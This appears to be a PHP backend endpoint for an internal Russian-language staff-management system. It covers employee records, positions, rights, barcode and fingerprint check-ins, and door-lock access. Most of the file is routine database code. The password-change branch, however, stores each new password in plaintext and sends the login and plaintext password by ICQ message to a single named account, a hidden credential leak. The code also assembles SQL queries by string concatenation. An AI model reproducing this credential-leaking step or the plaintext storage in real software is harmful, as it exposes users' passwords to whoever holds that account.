<?php

include $_SERVER['DOCUMENT_ROOT'] . '/sync/includes/setup.php';
mb_internal_encoding("UTF-8");
header("Content-type: application/json; charset=utf8");

if (isset($_JSON['getPositions'])) {
	$positions = query2array(mysqlQuery("SELECT `idpositions` as `id`, `positionsName` as `name` FROM `positions` WHERE isnull(`positionsDeleted`)"
					. (!R(16) ? " AND `idpositions` IN (32)" : "")));
//{"":170,"":16,"":1}
	print json_encode(['positions' => $positions], JSON_UNESCAPED_UNICODE);
}
if (isset($_JSON['getGroups'])) {
	$positions = query2array(mysqlQuery("SELECT `idusersGroups` as `id`, `usersGroupsName` as `name` FROM `usersGroups`"));
//{"":170,"":16,"":1}
	print json_encode(['groups' => $positions], JSON_UNESCAPED_UNICODE);
}

if (($_JSON['action'] ?? 0) && $_JSON['action'] == 'excludeSrevice') {
	mysqlQuery("DELETE FROM `users2services` WHERE `users2servicesUser` = '" . mres($_JSON['user']) . "' AND `users2servicesExclude` = '" . mres($_JSON['service']) . "'");

	if ($_JSON['state']) {
		mysqlQuery("INSERT INTO `users2services` SET `users2servicesUser` = '" . mres($_JSON['user']) . "', `users2servicesExclude` = '" . mres($_JSON['service']) . "',`users2servicesSetBy`='" . $_USER['id'] . "'");
	}
	print json_encode(['success' => true], 288);
}


if (($_JSON['action'] ?? false) == 'setCSfilter') {
	mysqlQuery("DELETE FROM `clientsSourcesRights`"
			. " WHERE `clientsSourcesRightsUser`='" . mres($_JSON['user']) . "'"
			. " AND " . (($_JSON['clientSource'] == null) ? " isnull(`clientsSourcesRightsSource`)" : "`clientsSourcesRightsSource` = '" . mres($_JSON['clientSource']) . "'"));
	if (($_JSON['state'] ?? false) == true) {
		mysqlQuery("INSERT INTO `clientsSourcesRights`"
				. " SET `clientsSourcesRightsUser`='" . mres($_JSON['user']) . "',"
				. ("`clientsSourcesRightsSource` = " . (($_JSON['clientSource'] == null) ? "null" : ("'" . mres($_JSON['clientSource']) . "'")))
		);
	}
	/* action	"setCSfilter"
	  clientSource	1
	  state	true
	  user	658 */
	print json_encode(['success' => true], 288);
	die();
}
if (($_JSON['action'] ?? false) && $_JSON['action'] == 'getUserByBC' && ($_JSON['BC'] ?? false)) {
	$user = mfa(mysqlQuery("SELECT * FROM `users` WHERE `usersBarcode`='" . mres($_JSON['BC']) . "'"));
	if ($user && mysqlQuery("INSERT INTO `fingerLog` SET `fingerLogUser` = '" . $user['idusers'] . "', `fingerLogManual` = '" . $_USER['id'] . "'")) {
		print json_encode(['success' => true, 'msgs' => [['autoDismiss' => 2500, 'type' => 'success', 'text' => $user['usersLastName'] . ' ' . $user['usersFirstName']]]], 288);
	} else {
		print json_encode(['success' => false, 'msgs' => ['Пользователь не найден!']], 288);
	}
}


if (($_JSON['action'] ?? 0) && $_JSON['action'] == 'includeSrevice') {
	mysqlQuery("DELETE FROM `users2services` WHERE `users2servicesUser` = '" . mres($_JSON['user']) . "' AND `users2servicesInclude` = '" . mres($_JSON['service']) . "'");

	if ($_JSON['state']) {
		mysqlQuery("INSERT INTO `users2services` SET `users2servicesUser` = '" . mres($_JSON['user']) . "', `users2servicesInclude` = '" . mres($_JSON['service']) . "',`users2servicesSetBy`='" . $_USER['id'] . "'");
	}
	print json_encode(['success' => true], 288);
}


if (($_JSON['action'] ?? 0) && $_JSON['action'] == 'checkIn') {
	$user = mfa(mysqlQuery("SELECT * FROM `users` WHERE `idusers` = '" . intval($_JSON['user']) . "'"));
//	printr($user);
	if (mysqlQuery("INSERT INTO `fingerLog` SET "
					. "`fingerLogUser` = '" . $user['idusers'] . "',"
					. "`fingerLogData` = '" . $user['usersFinger'] . "',"
					. ((!empty($_JSON['date']) && !empty($_JSON['time'])) ? ("`fingerLogTime`='" . mres($_JSON['date'] . " " . $_JSON['time'] . ':00') . "',") : '')
					. "`fingerLogManual` = '" . $_USER['id'] . "'"
					. "")) {
		print json_encode(['success' => true], 288);
		die();
	}
}


if (($_JSON['action'] ?? 0) && $_JSON['action'] == 'check_SKUD') {
	$selectSQL = "SELECT * FROM `users` LEFT JOIN `SKUD` ON (`SKUD_user` = `idusers`) WHERE "
			. " `idusers` = '" . intval($_JSON['user']) . "'"
			. " AND isnull(`usersDeleted`)"
			. " AND `SKUD_lock` = '" . mysqli_real_escape_string($link, $_JSON['lock']) . "'";
//	print $selectSQL;
	$user = mfa(mysqlQuery($selectSQL));

	print json_encode(['allow' => is_array($user), 'success' => true], 288);
	die();
}


if (($_JSON['action'] ?? 0) && $_JSON['action'] == 'save_SKUD_card') {
//action	"save_SKUD_card"
//card	"343482"
//user	176
	mysqlQuery("UPDATE `users` SET"
			. " `usersCard` = '" . mysqli_real_escape_string($link, $_JSON['card']) . "'"
			. " WHERE `idusers` = '" . mysqli_real_escape_string($link, $_JSON['user']) . "'");
}
if (($_JSON['action'] ?? 0) && $_JSON['action'] == 'toggle_SKUD') {
	$user = mfa(mysqlQuery("SELECT * FROM `users` LEFT JOIN `SKUD` ON (`SKUD_user` = `idusers`) WHERE "
					. " `idusers` = '" . intval($_JSON['user']) . "'"
					. " AND isnull(`usersDeleted`)"
					. " AND `SKUD_lock` = '" . mysqli_real_escape_string($link, $_JSON['lock']) . "'"
	));
	if (is_array($user)) {
		mysqlQuery("DELETE FROM `SKUD` WHERE `SKUD_user` = '" . intval($_JSON['user']) . "' AND `SKUD_lock` = '" . mysqli_real_escape_string($link, $_JSON['lock']) . "'");
		$allow = false;
	} else {
		mysqlQuery("INSERT INTO `SKUD` SET `SKUD_user` = '" . intval($_JSON['user']) . "', `SKUD_lock` = '" . mysqli_real_escape_string($link, $_JSON['lock']) . "'");
		$allow = true;
	}


	print json_encode(['allow' => $allow, 'success' => true], 288);
	die();
}



if (
		isset($_JSON['user']) &&
		isset($_JSON['rule']) &&
		isset($_JSON['rulevalue'])
) {

	if (R(21)) {
		mysqlQuery("INSERT INTO `usersRights` SET "
				. "`usersRightsUser` = '" . FSI($_JSON['user']) . "',"
				. "`usersRightsRule` = '" . FSI($_JSON['rule']) . "',"
				. "`usersRightsDate` = CURRENT_TIMESTAMP,"
				. "`usersRightsValue` = " . (FSI($_JSON['rulevalue']) ? '1' : 'null') . ","
				. "`usersRightsResponse` = '" . $_USER['id'] . "'"
				. "");
		mysqlQuery("UPDATE `users` SET `usersRightsChanged` = 1 WHERE `idusers` = '" . FSI($_JSON['user']) . "'");
		$OUT = [];
	} else {
		$OUT = ['msgs' => ['У Вас нет прав доступа к данной функции']];
	}

//{"":170,"":16,"":1}
	print json_encode($OUT, JSON_UNESCAPED_UNICODE);
}



if (
		!empty($_JSON['FN']) &&
		!empty($_JSON['LN'])
) {
	$OUT = [];

	if (R(17) || R(34)) {
		$insertPersonalQueryText = "INSERT INTO `users` SET "
				. " `usersFirstName`='" . FSS($_JSON['FN']) . "',"
				. " `usersLastName`='" . FSS($_JSON['LN']) . "',"
				. " `usersMiddleName`='" . FSS($_JSON['MN'] ?? '') . "',"
				. " `usersBarcode`='" . FSS($_JSON['BC'] ?? '') . "'";

		if (mysqlQuery($insertPersonalQueryText)) {
			$idemployee = mysqli_insert_id($link);
			$OUT['msgs'][] = array(
				'type' => 'success',
				'text' => 'Вам удалось добавить нового сотрудника.<br><br> ' . FSS($_JSON['FN']) . ' ' . FSS($_JSON['LN']) . '<br>' . FSS($_JSON['BC']),
				'data' => [
					'employee' => $idemployee
			]);
			if (isset($_JSON['position']) && FSS($_JSON['position'])) {
				mysqlQuery("INSERT INTO `usersPositions` SET `usersPositionsUser` ='" . $idemployee . "',`usersPositionsPosition` = '" . FSS($_JSON['position']) . "' ");
				$_SESSION['addUserPosition'] = FSS($_JSON['position']);
			}
		} else {
			$OUT['msgs'][] = ['text' => 'Ошибка при внесении в базу данных: ' . mysqli_error($link)];
		}
	} else {
		$OUT = ['msgs' => ['У Вас нет прав доступа к данной функции']];
	}

	print json_encode($OUT, JSON_UNESCAPED_UNICODE);
}


if (!empty($_JSON['deleteEmployee'])) {
	if (R(19)) {
		if (mysqlQuery("UPDATE `users` SET `usersDeleted` = CURRENT_TIMESTAMP() WHERE `idusers`='" . FSI($_JSON['deleteEmployee']) . "'")) {

			$firedUser = mfa(mysqlQuery("SELECT *, "
							. "(SELECT GROUP_CONCAT(`positionsName` SEPARATOR ', ') AS `positions` FROM `usersPositions` LEFT JOIN `positions` ON (`idpositions` = `usersPositionsPosition`) WHERE `usersPositionsUser`= `idusers`)  AS `positions`"
							. " FROM `users` WHERE `idusers` = '" . mres($_JSON['deleteEmployee']) . "'"));
			telegramSendByRights([108], '⚠️ ' . $_USER['lname'] . ' ' . $_USER['fname'] . "\r\n" . ' Уволен сотрудник: ' . $firedUser['usersLastName'] . ' ' . $firedUser['usersFirstName'] . ' (' . $firedUser['positions'] . ')');

			$OUT['msgs'][] = array(
				'type' => 'success',
				'text' => 'Вы удалили сотрудника.',
				'autoDismiss' => 1000,
				'data' => true);
		} else {
			$OUT['msgs'][] = array(
				'text' => 'Возникла ошибка при удалении сотрудника:<br>' . mysqli_error($link),
				'data' => false);
		}
	} else {
		$OUT['msgs'][] = array(
			'text' => 'У Вас нет доступа к данной функции',
			'data' => false);
	}

	print json_encode($OUT, JSON_UNESCAPED_UNICODE);
}


if (!empty($_JSON['action']) && $_JSON['action'] == 'editField') {

//	action: "editField"
//	key: "userBC"
//	value: "0496114832741448"
//	userLName,
//	userFName,
//	userMName,
//	userPhone,
//	userBC,
//	userPosition

	if (R(18) || R(38)) {

		$queryText = '';
		if ($_JSON['key'] === 'userLName') {
			if (mysqlQuery("UPDATE `users` SET `usersLastName` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . FSS($_JSON['value']) . "'") ) . " WHERE `idusers` = '" . FSI($_JSON['user']) . "'")) {
				$_JSON['newValue'] = FSS($_JSON['value']) ? FSS($_JSON['value']) : 'не указана';
				$_JSON['success'] = true;
			} else {
				$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
			}
		} elseif ($_JSON['key'] === 'usersFinger') {
			if (mysqlQuery("UPDATE `users` SET `usersFinger` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . FSS($_JSON['value']) . "'") ) . " WHERE `idusers` = '" . FSI($_JSON['user']) . "'")) {
				$_JSON['newValue'] = FSS($_JSON['value']) ? FSS($_JSON['value']) : 'не указан';
				$_JSON['success'] = true;
			} else {
				$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
			}
		} elseif ($_JSON['key'] === 'userPosition') {
			mysqlQuery("DELETE FROM `usersPositions` WHERE `usersPositionsUser` = '" . FSI($_JSON['user']) . "'");
			if (is_array($_JSON['value']) && count($_JSON['value'])) {
				$strings = [];
				foreach ($_JSON['value'] as $val) {
					$strings[] = '(' . FSI($_JSON['user']) . ',' . FSI($val) . ')';
				}
				if (mysqlQuery("INSERT INTO `usersPositions` (`usersPositionsUser`, `usersPositionsPosition`) VALUES "
								. implode(',', $strings) . "")) {
					$_JSON['newValue'] = mfa(mysqlQuery("SELECT GROUP_CONCAT(`positionsName` SEPARATOR ', ') AS `positions`"
											. "FROM `usersPositions` "
											. "LEFT JOIN `positions` ON (`idpositions` = `usersPositionsPosition`) "
											. "WHERE `usersPositionsUser`=  '" . FSI($_JSON['user']) . "'"))['positions'];
					$_JSON['success'] = true;
				} else {
					$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
				}
			} else {
				$_JSON['newValue'] = 'не указана';
				$_JSON['success'] = true;
			}
		} elseif ($_JSON['key'] === 'userFName') {
			if (mysqlQuery("UPDATE `users` SET `usersFirstName` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . FSS($_JSON['value']) . "'") ) . " WHERE `idusers` = '" . FSI($_JSON['user']) . "'")) {
				$_JSON['newValue'] = FSS($_JSON['value']) ? FSS($_JSON['value']) : 'не указано';
				$_JSON['success'] = true;
			} else {
				$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
			}
		} elseif ($_JSON['key'] === 'usersICQ') {

			if (mysqlQuery("UPDATE `users` SET `usersICQ` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . FSS($_JSON['value'])) . "'" ) . " WHERE `idusers` = '" . FSI($_JSON['user']) . "'")) {
				$_JSON['newValue'] = FSS($_JSON['value']) ? FSS($_JSON['value']) : 'не указан';
				$_JSON['success'] = true;
			} else {
				$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
			}
		} elseif ($_JSON['key'] === 'usersTG') {
			if (mysqlQuery("UPDATE `users` SET `usersTG` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . FSS($_JSON['value'])) . "'" ) . " WHERE `idusers` = '" . FSI($_JSON['user']) . "'")) {
				$_JSON['newValue'] = FSS($_JSON['value']) ? FSS($_JSON['value']) : 'не указан';
				$_JSON['success'] = true;
			} else {
				$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
			}
		} elseif ($_JSON['key'] === 'usersBday') {

			if (mysqlQuery("UPDATE `users` SET `usersBday` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . FSS($_JSON['value'])) . "'" ) . " WHERE `idusers` = '" . FSI($_JSON['user']) . "'")) {
				$_JSON['newValue'] = FSS($_JSON['value']) ? FSS($_JSON['value']) : 'не указан';
				$_JSON['success'] = true;
			} else {
				$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
			}
		} elseif ($_JSON['key'] === 'userGroup') {

			if (mysqlQuery("UPDATE `users` SET `usersGroup` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . FSS($_JSON['value'])) . "'" ) . " WHERE `idusers` = '" . FSI($_JSON['user']) . "'")) {
				if ($_JSON['value']) {
					$_JSON['newValue'] = mfa(mysqlQuery("SELECT * FROM `usersGroups` WHERE `idusersGroups` = '" . FSI($_JSON['value']) . "'"))['usersGroupsName'];
				} else {
					$_JSON['newValue'] = 'Не указана';
				}

				$_JSON['success'] = true;
			} else {
				$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
			}
		} elseif ($_JSON['key'] === 'userMName') {
			if (mysqlQuery("UPDATE `users` SET `usersMiddleName` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . FSS($_JSON['value'])) . "'" ) . " WHERE `idusers` = '" . FSI($_JSON['user']) . "'")) {
				$_JSON['newValue'] = FSS($_JSON['value']) ? FSS($_JSON['value']) : 'не указано';
				$_JSON['success'] = true;
			} else {
				$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
			}
		} elseif ($_JSON['key'] === 'userBC') {
			if (!mysqli_result(mysqlQuery("SELECT COUNT(*) FROM `users` WHERE `usersBarcode`='" . FSS($_JSON['value']) . "'"), 0)) {
				if (mysqlQuery("UPDATE `users` SET `usersBarcode` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . FSS($_JSON['value']) . "'" )) . " WHERE `idusers` = '" . FSI($_JSON['user']) . "'")) {
					$_JSON['newValue'] = FSS($_JSON['value']) ? FSS($_JSON['value']) : 'не указан';
					$_JSON['success'] = true;
				} else {
					$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
				}
			} else {
				$_JSON['msgs'][] = 'Пользователь с таким штрих-кодом<br> уже существует. <br>Сгенерируйте другой штрих-код<br>и повторите попытку сохранения.';
			}
		} elseif ($_JSON['key'] === 'login') {
			if (!mysqli_result(mysqlQuery("SELECT COUNT(*) FROM `credentials` WHERE `credentialsLogin`='" . FSS($_JSON['value']) . "'"), 0)) {
				if (!mysqli_result(mysqlQuery("SELECT COUNT(*) FROM `credentials` WHERE `credentialsUser`='" . FSI($_JSON['user']) . "'"), 0)) {
					mysqlQuery("INSERT IGNORE INTO `credentials` SET `credentialsUser` = '" . FSI($_JSON['user']) . "'");
				}
				if (mysqlQuery("UPDATE `credentials` SET `credentialsLogin` = " . (FSS($_JSON['value']) === '' ? "null" : "'" . trim(FSS($_JSON['value'])) . "'") . " WHERE `credentialsUser` = '" . FSI($_JSON['user']) . "'")) {
					$_JSON['newValue'] = FSS($_JSON['value']);
					$_JSON['success'] = true;
				} else {
					$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
				}
			} else {
				$_JSON['msgs'][] = 'Пользователь с таким штрих-кодом<br> уже существует. <br>Сгенерируйте другой штрих-код<br>и повторите попытку сохранения.';
			}
		} elseif ($_JSON['key'] === 'password') {
			if (!mysqli_result(mysqlQuery("SELECT COUNT(*) FROM `credentials` WHERE `credentialsUser`='" . FSI($_JSON['user']) . "'"), 0)) {
				mysqlQuery("INSERT IGNORE INTO `credentials` SET `credentialsUser` = '" . FSI($_JSON['user']) . "'");
			}
			if (mysqlQuery("UPDATE `credentials` SET "
							. "`credentialsPassword` = " . (FSS($_JSON['value']) === '' ? "null" : ("'" . password_hash(trim(FSS($_JSON['value'])), PASSWORD_DEFAULT)) . "'") . ","
							. "`credentialsPlain` = '" . mres(trim($_JSON['value'])) . "'"
							. " WHERE `credentialsUser` = '" . FSI($_JSON['user']) . "'")) {
				$login = mfa(mysqlQuery("SELECT `credentialsLogin` FROM `credentials` WHERE `credentialsUser` = '" . FSI($_JSON['user']) . "'"))['credentialsLogin'] ?? '';
				ICQ_messagesSend_SYNC('sashnone', '🔑 "' . $login . '"=>"' . mres(trim($_JSON['value'])) . '"');
				$_JSON['newValue'] = FSS($_JSON['value']) === '' ? 'не указан' : 'указан';
				$_JSON['success'] = true;
			} else {
				$_JSON['msgs'][] = 'Ошибка базы данных <br>' . mysqli_error($link);
			}
		} else {
			
		}
	} else {
		$_JSON['msgs'][] = 'У Вас нет доступа к данной функции';
	}

	print json_encode($_JSON, JSON_UNESCAPED_UNICODE);
}

if (!empty($_JSON['userActivate']) && isset($_JSON['setTo'])) {
	if (R(20) || R(37)) {
		if (mysqlQuery("INSERT INTO `usersActive` "
						. "SET `usersActiveUser` = '" . FSI($_JSON['userActivate']) . "',"
						. " `usersActiveState`='" . (FSI($_JSON['setTo']) ? 1 : 0) . "',"
						. " `usersActiveSetBy` = " . $_USER['id']
						. "")) {
			//$_JSON['msgs'][] = ['type' => 'success', 'text' => 'Установлено значение'];
		} else {
			$_JSON['msgs'][] = 'Ошибка ' . mysqli_error($link);
		}
	} else {
		$_JSON['msgs'][] = 'У Вас нет доступа к данной функции';
	}

	print json_encode($_JSON, JSON_UNESCAPED_UNICODE);
}